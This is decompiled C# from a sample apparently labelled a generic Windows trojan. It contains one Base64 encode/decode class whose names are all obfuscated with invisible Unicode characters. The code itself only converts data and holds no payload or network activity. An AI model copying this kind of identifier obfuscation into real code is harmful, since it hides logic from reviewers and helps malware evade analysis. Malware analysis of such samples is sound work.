// Decompiled with JetBrains decompiler
// Type: ‌‍⁮‫‪‪⁮​‮‍‌⁮⁪‍⁭⁪‌‏‌⁮⁫‮‌⁯⁪​‪⁬‭‮‪⁫‭‮‭‪⁫‎‬⁪‮
// Assembly: ReadLineS0SAT, Version=2.0.8.1, Culture=neutral, PublicKeyToken=null
// MVID: 826822DE-6F21-4D67-9238-0DAF50EB618B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-9ec8f988ff41765b68c6a4d29d259fafb62e97ad2d3633c43fbe0ab0dd12518d.exe

using System;
using System.IO;

public class \u200C‍⁮‫‪‪⁮​‮‍‌⁮⁪‍⁭⁪‌‏‌⁮⁫‮‌⁯⁪​‪⁬‭‮‪⁫‭‮‭‪⁫‎‬⁪‮ : 
  \u206F‫⁫​‎‏⁯‪⁪‫⁬‮‮‎‪⁭‌​‫‮‫⁬‏‮​‭‎‭‬⁮‬‬‮⁭‬‍‫⁭⁫‮
{
  protected readonly byte[] \u202A‌‮⁬‪‫⁮‌⁭‫‭‮‬⁯‍⁬⁭‭‭⁬⁫⁯‮⁪⁪⁯⁮‍‎‏‍‪‍‪⁯‮⁬‪⁮⁯‮ = new byte[64]
  {
    (byte) 65,
    (byte) 66,
    (byte) 67,
    (byte) 68,
    (byte) 69,
    (byte) 70,
    (byte) 71,
    (byte) 72,
    (byte) 73,
    (byte) 74,
    (byte) 75,
    (byte) 76,
    (byte) 77,
    (byte) 78,
    (byte) 79,
    (byte) 80,
    (byte) 81,
    (byte) 82,
    (byte) 83,
    (byte) 84,
    (byte) 85,
    (byte) 86,
    (byte) 87,
    (byte) 88,
    (byte) 89,
    (byte) 90,
    (byte) 97,
    (byte) 98,
    (byte) 99,
    (byte) 100,
    (byte) 101,
    (byte) 102,
    (byte) 103,
    (byte) 104,
    (byte) 105,
    (byte) 106,
    (byte) 107,
    (byte) 108,
    (byte) 109,
    (byte) 110,
    (byte) 111,
    (byte) 112,
    (byte) 113,
    (byte) 114,
    (byte) 115,
    (byte) 116,
    (byte) 117,
    (byte) 118,
    (byte) 119,
    (byte) 120,
    (byte) 121,
    (byte) 122,
    (byte) 48,
    (byte) 49,
    (byte) 50,
    (byte) 51,
    (byte) 52,
    (byte) 53,
    (byte) 54,
    (byte) 55,
    (byte) 56,
    (byte) 57,
    (byte) 43,
    (byte) 47
  };
  protected byte \u200C⁯⁪‪‍‏‬⁭‬‬⁭⁯‫‪‬⁯⁪‏⁭⁮‭‍⁮‪‍‮‭⁬‎‏‏‫​⁭‭⁭⁮​‎⁬‮ = 61;
  protected readonly byte[] \u200D‎⁫‪‪‪‮⁬‍⁫⁪‌‪⁮⁭‎‬⁮⁬⁬‮⁯‎‌‪‮⁯‌⁪‪⁮‎‫⁯⁬‫⁮⁪‌‎‮ = new byte[128];

  protected void \u206D⁪⁮‍⁫‎‍​‍⁮⁯‮⁮‍‫⁯‎‬‮⁮‎‏‪‌‭‎‬​⁯‌‌‪⁪‌‫⁬⁯‬⁪‮()
  {
    \u206D‭‎‏⁪⁫‌⁫⁫‮‮​‮‫⁯‎​⁮‭‍⁬⁫⁭⁬‎⁭‫‮‫⁬⁫‬‮⁪‌⁮⁬⁭⁬‪‮.\u202E‫⁭‬‌⁫‮‏‫‮‪⁬‫‫⁬⁪⁪⁭‬‏⁫⁮‏⁪‫‬‭‮⁬‪‍‫⁭‪‍⁯‫‭‍‫‮(this.\u200D‎⁫‪‪‪‮⁬‍⁫⁪‌‪⁮⁭‎‬⁮⁬⁬‮⁯‎‌‪‮⁯‌⁪‪⁮‎‫⁯⁬‫⁮⁪‌‎‮, byte.MaxValue);
    for (int index = 0; index < this.\u202A‌‮⁬‪‫⁮‌⁭‫‭‮‬⁯‍⁬⁭‭‭⁬⁫⁯‮⁪⁪⁯⁮‍‎‏‍‪‍‪⁯‮⁬‪⁮⁯‮.Length; ++index)
      this.\u200D‎⁫‪‪‪‮⁬‍⁫⁪‌‪⁮⁭‎‬⁮⁬⁬‮⁯‎‌‪‮⁯‌⁪‪⁮‎‫⁯⁬‫⁮⁪‌‎‮[(int) this.\u202A‌‮⁬‪‫⁮‌⁭‫‭‮‬⁯‍⁬⁭‭‭⁬⁫⁯‮⁪⁪⁯⁮‍‎‏‍‪‍‪⁯‮⁬‪⁮⁯‮[index]] = (byte) index;
  }

  public \u200C‍⁮‫‪‪⁮​‮‍‌⁮⁪‍⁭⁪‌‏‌⁮⁫‮‌⁯⁪​‪⁬‭‮‪⁫‭‮‭‪⁫‎‬⁪‮() => this.\u206D⁪⁮‍⁫‎‍​‍⁮⁯‮⁮‍‫⁯‎‬‮⁮‎‏‪‌‭‎‬​⁯‌‌‪⁪‌‫⁬⁯‬⁪‮();

  public int \u206C‮⁯‌⁯‌⁭⁫‪‭​‪‫⁫⁪⁯⁭⁫‎⁬‫‫⁮‎‮⁬⁪‮‎‫‭⁪⁭⁫⁪‪⁪⁬‭‫‮(
    byte[] _param1,
    int _param2,
    int _param3,
    byte[] _param4,
    int _param5)
  {
    int num1 = _param2;
    int num2 = _param2 + _param3 - 2;
    int num3 = _param5;
    while (num1 < num2)
    {
      byte[] numArray1 = _param1;
      int index1 = num1;
      int num4 = index1 + 1;
      uint num5 = (uint) numArray1[index1];
      byte[] numArray2 = _param1;
      int index2 = num4;
      int num6 = index2 + 1;
      uint num7 = (uint) numArray2[index2];
      byte[] numArray3 = _param1;
      int index3 = num6;
      num1 = index3 + 1;
      uint num8 = (uint) numArray3[index3];
      byte[] numArray4 = _param4;
      int index4 = num3;
      int num9 = index4 + 1;
      int num10 = (int) this.\u202A‌‮⁬‪‫⁮‌⁭‫‭‮‬⁯‍⁬⁭‭‭⁬⁫⁯‮⁪⁪⁯⁮‍‎‏‍‪‍‪⁯‮⁬‪⁮⁯‮[(int) (num5 >> 2) & 63];
      numArray4[index4] = (byte) num10;
      byte[] numArray5 = _param4;
      int index5 = num9;
      int num11 = index5 + 1;
      int num12 = (int) this.\u202A‌‮⁬‪‫⁮‌⁭‫‭‮‬⁯‍⁬⁭‭‭⁬⁫⁯‮⁪⁪⁯⁮‍‎‏‍‪‍‪⁯‮⁬‪⁮⁯‮[((int) num5 << 4 | (int) (num7 >> 4)) & 63];
      numArray5[index5] = (byte) num12;
      byte[] numArray6 = _param4;
      int index6 = num11;
      int num13 = index6 + 1;
      int num14 = (int) this.\u202A‌‮⁬‪‫⁮‌⁭‫‭‮‬⁯‍⁬⁭‭‭⁬⁫⁯‮⁪⁪⁯⁮‍‎‏‍‪‍‪⁯‮⁬‪⁮⁯‮[((int) num7 << 2 | (int) (num8 >> 6)) & 63];
      numArray6[index6] = (byte) num14;
      byte[] numArray7 = _param4;
      int index7 = num13;
      num3 = index7 + 1;
      int num15 = (int) this.\u202A‌‮⁬‪‫⁮‌⁭‫‭‮‬⁯‍⁬⁭‭‭⁬⁫⁯‮⁪⁪⁯⁮‍‎‏‍‪‍‪⁯‮⁬‪⁮⁯‮[(int) num8 & 63];
      numArray7[index7] = (byte) num15;
    }
    int num16;
    switch (_param3 - (num1 - _param2))
    {
      case 1:
        byte[] numArray8 = _param1;
        int index8 = num1;
        num16 = index8 + 1;
        uint num17 = (uint) numArray8[index8];
        byte[] numArray9 = _param4;
        int index9 = num3;
        int num18 = index9 + 1;
        int num19 = (int) this.\u202A‌‮⁬‪‫⁮‌⁭‫‭‮‬⁯‍⁬⁭‭‭⁬⁫⁯‮⁪⁪⁯⁮‍‎‏‍‪‍‪⁯‮⁬‪⁮⁯‮[(int) (num17 >> 2) & 63];
        numArray9[index9] = (byte) num19;
        byte[] numArray10 = _param4;
        int index10 = num18;
        int num20 = index10 + 1;
        int num21 = (int) this.\u202A‌‮⁬‪‫⁮‌⁭‫‭‮‬⁯‍⁬⁭‭‭⁬⁫⁯‮⁪⁪⁯⁮‍‎‏‍‪‍‪⁯‮⁬‪⁮⁯‮[(int) num17 << 4 & 63];
        numArray10[index10] = (byte) num21;
        byte[] numArray11 = _param4;
        int index11 = num20;
        int num22 = index11 + 1;
        int num23 = (int) this.\u200C⁯⁪‪‍‏‬⁭‬‬⁭⁯‫‪‬⁯⁪‏⁭⁮‭‍⁮‪‍‮‭⁬‎‏‏‫​⁭‭⁭⁮​‎⁬‮;
        numArray11[index11] = (byte) num23;
        byte[] numArray12 = _param4;
        int index12 = num22;
        num3 = index12 + 1;
        int num24 = (int) this.\u200C⁯⁪‪‍‏‬⁭‬‬⁭⁯‫‪‬⁯⁪‏⁭⁮‭‍⁮‪‍‮‭⁬‎‏‏‫​⁭‭⁭⁮​‎⁬‮;
        numArray12[index12] = (byte) num24;
        break;
      case 2:
        byte[] numArray13 = _param1;
        int index13 = num1;
        int num25 = index13 + 1;
        uint num26 = (uint) numArray13[index13];
        byte[] numArray14 = _param1;
        int index14 = num25;
        num16 = index14 + 1;
        uint num27 = (uint) numArray14[index14];
        byte[] numArray15 = _param4;
        int index15 = num3;
        int num28 = index15 + 1;
        int num29 = (int) this.\u202A‌‮⁬‪‫⁮‌⁭‫‭‮‬⁯‍⁬⁭‭‭⁬⁫⁯‮⁪⁪⁯⁮‍‎‏‍‪‍‪⁯‮⁬‪⁮⁯‮[(int) (num26 >> 2) & 63];
        numArray15[index15] = (byte) num29;
        byte[] numArray16 = _param4;
        int index16 = num28;
        int num30 = index16 + 1;
        int num31 = (int) this.\u202A‌‮⁬‪‫⁮‌⁭‫‭‮‬⁯‍⁬⁭‭‭⁬⁫⁯‮⁪⁪⁯⁮‍‎‏‍‪‍‪⁯‮⁬‪⁮⁯‮[((int) num26 << 4 | (int) (num27 >> 4)) & 63];
        numArray16[index16] = (byte) num31;
        byte[] numArray17 = _param4;
        int index17 = num30;
        int num32 = index17 + 1;
        int num33 = (int) this.\u202A‌‮⁬‪‫⁮‌⁭‫‭‮‬⁯‍⁬⁭‭‭⁬⁫⁯‮⁪⁪⁯⁮‍‎‏‍‪‍‪⁯‮⁬‪⁮⁯‮[(int) num27 << 2 & 63];
        numArray17[index17] = (byte) num33;
        byte[] numArray18 = _param4;
        int index18 = num32;
        num3 = index18 + 1;
        int num34 = (int) this.\u200C⁯⁪‪‍‏‬⁭‬‬⁭⁯‫‪‬⁯⁪‏⁭⁮‭‍⁮‪‍‮‭⁬‎‏‏‫​⁭‭⁭⁮​‎⁬‮;
        numArray18[index18] = (byte) num34;
        break;
    }
    return num3 - _param5;
  }

  public int \u206C‮⁯‌⁯‌⁭⁫‪‭​‪‫⁫⁪⁯⁭⁫‎⁬‫‫⁮‎‮⁬⁪‮‎‫‭⁪⁭⁫⁪‪⁪⁬‭‫‮(
    byte[] _param1,
    int _param2,
    int _param3,
    Stream _param4)
  {
    if (_param3 < 0)
      return 0;
    byte[] buffer = new byte[72];
    int num;
    for (int val2 = _param3; val2 > 0; val2 -= num)
    {
      num = Math.Min(54, val2);
      int count = this.\u206C‮⁯‌⁯‌⁭⁫‪‭​‪‫⁫⁪⁯⁭⁫‎⁬‫‫⁮‎‮⁬⁪‮‎‫‭⁪⁭⁫⁪‪⁪⁬‭‫‮(_param1, _param2, num, buffer, 0);
      _param4.Write(buffer, 0, count);
      _param2 += num;
    }
    return (_param3 + 2) / 3 * 4;
  }

  private bool \u202C‏⁯⁭‍‭‌‬⁭⁫⁯⁮‍⁮⁫‫‫‫‫‌‍‮‫‪‏​‌⁮⁫⁬⁯⁭‎⁫⁯‪‮‍⁭‭‮(char _param1) => _param1 == '\n' || _param1 == '\r' || _param1 == '\t' || _param1 == ' ';

  public int \u200D⁮‭‎⁪‏‌⁬‮‎⁬⁭‮‎⁫⁮⁯‌‏⁬‍⁭​‎​‍‏‏‌⁭‫‬⁯⁪‎⁪‮⁫⁬⁬‮(
    byte[] _param1,
    int _param2,
    int _param3,
    Stream _param4)
  {
    byte[] buffer = new byte[54];
    int count = 0;
    int num1 = 0;
    int num2 = _param2 + _param3;
    while (num2 > _param2 && this.\u202C‏⁯⁭‍‭‌‬⁭⁫⁯⁮‍⁮⁫‫‫‫‫‌‍‮‫‪‏​‌⁮⁫⁬⁯⁭‎⁫⁯‪‮‍⁭‭‮((char) _param1[num2 - 1]))
      --num2;
    int num3 = _param2;
    int num4 = num2 - 4;
    int num5;
    int num6;
    for (num5 = this.\u200E⁪‎‎⁬‪‬‪‭‫‫‍‫‬​‏‍⁯⁪⁮‫⁮‪⁯‍‎‪⁪⁫⁯⁬⁬‪‬‭​​⁪⁪⁯‮(_param1, num3, num4); num5 < num4; num5 = this.\u200E⁪‎‎⁬‪‬‪‭‫‫‍‫‬​‏‍⁯⁪⁮‫⁮‪⁯‍‎‪⁪⁫⁯⁬⁬‪‬‭​​⁪⁪⁯‮(_param1, num6, num4))
    {
      byte[] numArray1 = this.\u200D‎⁫‪‪‪‮⁬‍⁫⁪‌‪⁮⁭‎‬⁮⁬⁬‮⁯‎‌‪‮⁯‌⁪‪⁮‎‫⁯⁬‫⁮⁪‌‎‮;
      byte[] numArray2 = _param1;
      int index1 = num5;
      int num7 = index1 + 1;
      int index2 = (int) numArray2[index1];
      byte num8 = numArray1[index2];
      int num9 = this.\u200E⁪‎‎⁬‪‬‪‭‫‫‍‫‬​‏‍⁯⁪⁮‫⁮‪⁯‍‎‪⁪⁫⁯⁬⁬‪‬‭​​⁪⁪⁯‮(_param1, num7, num4);
      byte[] numArray3 = this.\u200D‎⁫‪‪‪‮⁬‍⁫⁪‌‪⁮⁭‎‬⁮⁬⁬‮⁯‎‌‪‮⁯‌⁪‪⁮‎‫⁯⁬‫⁮⁪‌‎‮;
      byte[] numArray4 = _param1;
      int index3 = num9;
      int num10 = index3 + 1;
      int index4 = (int) numArray4[index3];
      byte num11 = numArray3[index4];
      int num12 = this.\u200E⁪‎‎⁬‪‬‪‭‫‫‍‫‬​‏‍⁯⁪⁮‫⁮‪⁯‍‎‪⁪⁫⁯⁬⁬‪‬‭​​⁪⁪⁯‮(_param1, num10, num4);
      byte[] numArray5 = this.\u200D‎⁫‪‪‪‮⁬‍⁫⁪‌‪⁮⁭‎‬⁮⁬⁬‮⁯‎‌‪‮⁯‌⁪‪⁮‎‫⁯⁬‫⁮⁪‌‎‮;
      byte[] numArray6 = _param1;
      int index5 = num12;
      int num13 = index5 + 1;
      int index6 = (int) numArray6[index5];
      byte num14 = numArray5[index6];
      int num15 = this.\u200E⁪‎‎⁬‪‬‪‭‫‫‍‫‬​‏‍⁯⁪⁮‫⁮‪⁯‍‎‪⁪⁫⁯⁬⁬‪‬‭​​⁪⁪⁯‮(_param1, num13, num4);
      byte[] numArray7 = this.\u200D‎⁫‪‪‪‮⁬‍⁫⁪‌‪⁮⁭‎‬⁮⁬⁬‮⁯‎‌‪‮⁯‌⁪‪⁮‎‫⁯⁬‫⁮⁪‌‎‮;
      byte[] numArray8 = _param1;
      int index7 = num15;
      num6 = index7 + 1;
      int index8 = (int) numArray8[index7];
      byte num16 = numArray7[index8];
      if (((int) num8 | (int) num11 | (int) num14 | (int) num16) >= 128)
        throw new IOException("invalid characters encountered in base64 data");
      byte[] numArray9 = buffer;
      int index9 = count;
      int num17 = index9 + 1;
      int num18 = (int) (byte) ((int) num8 << 2 | (int) num11 >> 4);
      numArray9[index9] = (byte) num18;
      byte[] numArray10 = buffer;
      int index10 = num17;
      int num19 = index10 + 1;
      int num20 = (int) (byte) ((int) num11 << 4 | (int) num14 >> 2);
      numArray10[index10] = (byte) num20;
      byte[] numArray11 = buffer;
      int index11 = num19;
      count = index11 + 1;
      int num21 = (int) (byte) ((uint) num14 << 6 | (uint) num16);
      numArray11[index11] = (byte) num21;
      if (count == buffer.Length)
      {
        _param4.Write(buffer, 0, count);
        count = 0;
      }
      num1 += 3;
    }
    if (count > 0)
      _param4.Write(buffer, 0, count);
    int index12 = this.\u200E⁪‎‎⁬‪‬‪‭‫‫‍‫‬​‏‍⁯⁪⁮‫⁮‪⁯‍‎‪⁪⁫⁯⁬⁬‪‬‭​​⁪⁪⁯‮(_param1, num5, num2);
    int index13 = this.\u200E⁪‎‎⁬‪‬‪‭‫‫‍‫‬​‏‍⁯⁪⁮‫⁮‪⁯‍‎‪⁪⁫⁯⁬⁬‪‬‭​​⁪⁪⁯‮(_param1, index12 + 1, num2);
    int index14 = this.\u200E⁪‎‎⁬‪‬‪‭‫‫‍‫‬​‏‍⁯⁪⁮‫⁮‪⁯‍‎‪⁪⁫⁯⁬⁬‪‬‭​​⁪⁪⁯‮(_param1, index13 + 1, num2);
    int index15 = this.\u200E⁪‎‎⁬‪‬‪‭‫‫‍‫‬​‏‍⁯⁪⁮‫⁮‪⁯‍‎‪⁪⁫⁯⁬⁬‪‬‭​​⁪⁪⁯‮(_param1, index14 + 1, num2);
    return num1 + this.\u206D⁫⁬⁯‬⁯⁭⁮‬⁮​‌‭⁪‭‎‫‪‪​‍‬⁪‮‪‌‮‏⁮‭‪‭​​​‏⁪‫⁮‬‮(_param4, (char) _param1[index12], (char) _param1[index13], (char) _param1[index14], (char) _param1[index15]);
  }

  private int \u200E⁪‎‎⁬‪‬‪‭‫‫‍‫‬​‏‍⁯⁪⁮‫⁮‪⁯‍‎‪⁪⁫⁯⁬⁬‪‬‭​​⁪⁪⁯‮(
    byte[] _param1,
    int _param2,
    int _param3)
  {
    while (_param2 < _param3 && this.\u202C‏⁯⁭‍‭‌‬⁭⁫⁯⁮‍⁮⁫‫‫‫‫‌‍‮‫‪‏​‌⁮⁫⁬⁯⁭‎⁫⁯‪‮‍⁭‭‮((char) _param1[_param2]))
      ++_param2;
    return _param2;
  }

  public int \u206C⁮‎⁮⁯⁫‌‫​‬‫⁬‬‮⁬‏‍‎⁪‪‫​‫‏‪⁮‍⁫⁯⁮⁪​‫‭‏‌⁪⁪⁯‫‮(string _param1, Stream _param2)
  {
    int num1 = 0;
    int length = _param1.Length;
    while (length > 0 && this.\u202C‏⁯⁭‍‭‌‬⁭⁫⁯⁮‍⁮⁫‫‫‫‫‌‍‮‫‪‏​‌⁮⁫⁬⁯⁭‎⁫⁯‪‮‍⁭‭‮(_param1[length - 1]))
      --length;
    int num2 = 0;
    int num3 = length - 4;
    int num4;
    for (int index1 = this.\u200E⁪‎‎⁬‪‬‪‭‫‫‍‫‬​‏‍⁯⁪⁮‫⁮‪⁯‍‎‪⁪⁫⁯⁬⁬‪‬‭​​⁪⁪⁯‮(_param1, num2, num3); index1 < num3; index1 = this.\u200E⁪‎‎⁬‪‬‪‭‫‫‍‫‬​‏‍⁯⁪⁮‫⁮‪⁯‍‎‪⁪⁫⁯⁬⁬‪‬‭​​⁪⁪⁯‮(_param1, num4, num3))
    {
      byte[] numArray1 = this.\u200D‎⁫‪‪‪‮⁬‍⁫⁪‌‪⁮⁭‎‬⁮⁬⁬‮⁯‎‌‪‮⁯‌⁪‪⁮‎‫⁯⁬‫⁮⁪‌‎‮;
      string str1 = _param1;
      int index2 = index1;
      int num5 = index2 + 1;
      int index3 = (int) str1[index2];
      byte num6 = numArray1[index3];
      int num7 = this.\u200E⁪‎‎⁬‪‬‪‭‫‫‍‫‬​‏‍⁯⁪⁮‫⁮‪⁯‍‎‪⁪⁫⁯⁬⁬‪‬‭​​⁪⁪⁯‮(_param1, num5, num3);
      byte[] numArray2 = this.\u200D‎⁫‪‪‪‮⁬‍⁫⁪‌‪⁮⁭‎‬⁮⁬⁬‮⁯‎‌‪‮⁯‌⁪‪⁮‎‫⁯⁬‫⁮⁪‌‎‮;
      string str2 = _param1;
      int index4 = num7;
      int num8 = index4 + 1;
      int index5 = (int) str2[index4];
      byte num9 = numArray2[index5];
      int num10 = this.\u200E⁪‎‎⁬‪‬‪‭‫‫‍‫‬​‏‍⁯⁪⁮‫⁮‪⁯‍‎‪⁪⁫⁯⁬⁬‪‬‭​​⁪⁪⁯‮(_param1, num8, num3);
      byte[] numArray3 = this.\u200D‎⁫‪‪‪‮⁬‍⁫⁪‌‪⁮⁭‎‬⁮⁬⁬‮⁯‎‌‪‮⁯‌⁪‪⁮‎‫⁯⁬‫⁮⁪‌‎‮;
      string str3 = _param1;
      int index6 = num10;
      int num11 = index6 + 1;
      int index7 = (int) str3[index6];
      byte num12 = numArray3[index7];
      int num13 = this.\u200E⁪‎‎⁬‪‬‪‭‫‫‍‫‬​‏‍⁯⁪⁮‫⁮‪⁯‍‎‪⁪⁫⁯⁬⁬‪‬‭​​⁪⁪⁯‮(_param1, num11, num3);
      byte[] numArray4 = this.\u200D‎⁫‪‪‪‮⁬‍⁫⁪‌‪⁮⁭‎‬⁮⁬⁬‮⁯‎‌‪‮⁯‌⁪‪⁮‎‫⁯⁬‫⁮⁪‌‎‮;
      string str4 = _param1;
      int index8 = num13;
      num4 = index8 + 1;
      int index9 = (int) str4[index8];
      byte num14 = numArray4[index9];
      if (((int) num6 | (int) num9 | (int) num12 | (int) num14) >= 128)
        throw new IOException("invalid characters encountered in base64 data");
      _param2.WriteByte((byte) ((int) num6 << 2 | (int) num9 >> 4));
      _param2.WriteByte((byte) ((int) num9 << 4 | (int) num12 >> 2));
      _param2.WriteByte((byte) ((uint) num12 << 6 | (uint) num14));
      num1 += 3;
    }
    return num1 + this.\u206D⁫⁬⁯‬⁯⁭⁮‬⁮​‌‭⁪‭‎‫‪‪​‍‬⁪‮‪‌‮‏⁮‭‪‭​​​‏⁪‫⁮‬‮(_param2, _param1[length - 4], _param1[length - 3], _param1[length - 2], _param1[length - 1]);
  }

  private int \u206D⁫⁬⁯‬⁯⁭⁮‬⁮​‌‭⁪‭‎‫‪‪​‍‬⁪‮‪‌‮‏⁮‭‪‭​​​‏⁪‫⁮‬‮(
    Stream _param1,
    char _param2,
    char _param3,
    char _param4,
    char _param5)
  {
    if ((int) _param4 == (int) this.\u200C⁯⁪‪‍‏‬⁭‬‬⁭⁯‫‪‬⁯⁪‏⁭⁮‭‍⁮‪‍‮‭⁬‎‏‏‫​⁭‭⁭⁮​‎⁬‮)
    {
      if ((int) _param5 != (int) this.\u200C⁯⁪‪‍‏‬⁭‬‬⁭⁯‫‪‬⁯⁪‏⁭⁮‭‍⁮‪‍‮‭⁬‎‏‏‫​⁭‭⁭⁮​‎⁬‮)
        throw new IOException("invalid characters encountered at end of base64 data");
      byte num1 = this.\u200D‎⁫‪‪‪‮⁬‍⁫⁪‌‪⁮⁭‎‬⁮⁬⁬‮⁯‎‌‪‮⁯‌⁪‪⁮‎‫⁯⁬‫⁮⁪‌‎‮[(int) _param2];
      byte num2 = this.\u200D‎⁫‪‪‪‮⁬‍⁫⁪‌‪⁮⁭‎‬⁮⁬⁬‮⁯‎‌‪‮⁯‌⁪‪⁮‎‫⁯⁬‫⁮⁪‌‎‮[(int) _param3];
      if (((int) num1 | (int) num2) >= 128)
        throw new IOException("invalid characters encountered at end of base64 data");
      _param1.WriteByte((byte) ((int) num1 << 2 | (int) num2 >> 4));
      return 1;
    }
    if ((int) _param5 == (int) this.\u200C⁯⁪‪‍‏‬⁭‬‬⁭⁯‫‪‬⁯⁪‏⁭⁮‭‍⁮‪‍‮‭⁬‎‏‏‫​⁭‭⁭⁮​‎⁬‮)
    {
      byte num3 = this.\u200D‎⁫‪‪‪‮⁬‍⁫⁪‌‪⁮⁭‎‬⁮⁬⁬‮⁯‎‌‪‮⁯‌⁪‪⁮‎‫⁯⁬‫⁮⁪‌‎‮[(int) _param2];
      byte num4 = this.\u200D‎⁫‪‪‪‮⁬‍⁫⁪‌‪⁮⁭‎‬⁮⁬⁬‮⁯‎‌‪‮⁯‌⁪‪⁮‎‫⁯⁬‫⁮⁪‌‎‮[(int) _param3];
      byte num5 = this.\u200D‎⁫‪‪‪‮⁬‍⁫⁪‌‪⁮⁭‎‬⁮⁬⁬‮⁯‎‌‪‮⁯‌⁪‪⁮‎‫⁯⁬‫⁮⁪‌‎‮[(int) _param4];
      if (((int) num3 | (int) num4 | (int) num5) >= 128)
        throw new IOException("invalid characters encountered at end of base64 data");
      _param1.WriteByte((byte) ((int) num3 << 2 | (int) num4 >> 4));
      _param1.WriteByte((byte) ((int) num4 << 4 | (int) num5 >> 2));
      return 2;
    }
    byte num6 = this.\u200D‎⁫‪‪‪‮⁬‍⁫⁪‌‪⁮⁭‎‬⁮⁬⁬‮⁯‎‌‪‮⁯‌⁪‪⁮‎‫⁯⁬‫⁮⁪‌‎‮[(int) _param2];
    byte num7 = this.\u200D‎⁫‪‪‪‮⁬‍⁫⁪‌‪⁮⁭‎‬⁮⁬⁬‮⁯‎‌‪‮⁯‌⁪‪⁮‎‫⁯⁬‫⁮⁪‌‎‮[(int) _param3];
    byte num8 = this.\u200D‎⁫‪‪‪‮⁬‍⁫⁪‌‪⁮⁭‎‬⁮⁬⁬‮⁯‎‌‪‮⁯‌⁪‪⁮‎‫⁯⁬‫⁮⁪‌‎‮[(int) _param4];
    byte num9 = this.\u200D‎⁫‪‪‪‮⁬‍⁫⁪‌‪⁮⁭‎‬⁮⁬⁬‮⁯‎‌‪‮⁯‌⁪‪⁮‎‫⁯⁬‫⁮⁪‌‎‮[(int) _param5];
    if (((int) num6 | (int) num7 | (int) num8 | (int) num9) >= 128)
      throw new IOException("invalid characters encountered at end of base64 data");
    _param1.WriteByte((byte) ((int) num6 << 2 | (int) num7 >> 4));
    _param1.WriteByte((byte) ((int) num7 << 4 | (int) num8 >> 2));
    _param1.WriteByte((byte) ((uint) num8 << 6 | (uint) num9));
    return 3;
  }

  private int \u200E⁪‎‎⁬‪‬‪‭‫‫‍‫‬​‏‍⁯⁪⁮‫⁮‪⁯‍‎‪⁪⁫⁯⁬⁬‪‬‭​​⁪⁪⁯‮(
    string _param1,
    int _param2,
    int _param3)
  {
    while (_param2 < _param3 && this.\u202C‏⁯⁭‍‭‌‬⁭⁫⁯⁮‍⁮⁫‫‫‫‫‌‍‮‫‪‏​‌⁮⁫⁬⁯⁭‎⁫⁯‪‮‍⁭‭‮(_param1[_param2]))
      ++_param2;
    return _param2;
  }
}
